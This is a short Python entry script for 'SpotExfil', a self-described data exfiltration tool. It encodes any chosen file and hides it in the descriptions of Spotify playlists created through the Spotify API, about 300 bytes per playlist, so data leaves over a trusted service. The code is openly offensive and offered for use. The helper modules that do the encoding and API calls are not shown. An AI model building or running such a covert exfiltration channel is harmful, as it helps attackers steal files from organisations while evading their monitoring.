#!/usr/bin/env python3
"""SpotExfil - A data exfiltration tool using Spotify playlists.

This tool is a quick and dirty way to save/retrieve a payload
using Spotify API and playlists. 1 playlist every 300 bytes as per
the limitation of the description field.

Pre-requisites:
* A valid Spotify API setup, will need:
            self.username = os.environ["SPOTIFY_USERNAME"]
            self.redirect_uri = os.environ["SPOTIFY_REDIRECTURI"]
            self.client_id = os.environ["SPOTIFY_CLIENT_ID"]
            self.client_secret = os.environ["SPOTIFY_CLIENT_SECRET"]
"""
import encoding
import optparse
import spotapi as spot


__author__ = '@sourcefrenchy'
__copyright__ = 'none'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'


def set_options():
    """Define options for the program."""
    parser = optparse.OptionParser()
    parser.add_option(
        "-f", "--file", action="store", dest="file", help="Send a file")
    (options, _) = parser.parse_args()
    if options.file is None:
        print(parser.parse_args(['--help']))
    else:
        return options


if __name__ == "__main__":
    options = set_options()
    S = spot.Spot()
    C = encoding.Subcipher(S)

    if options.file:
        S.clear_data()
        encoded = C.encode_payload(options.file)
        S.generate_playlists(encoded)

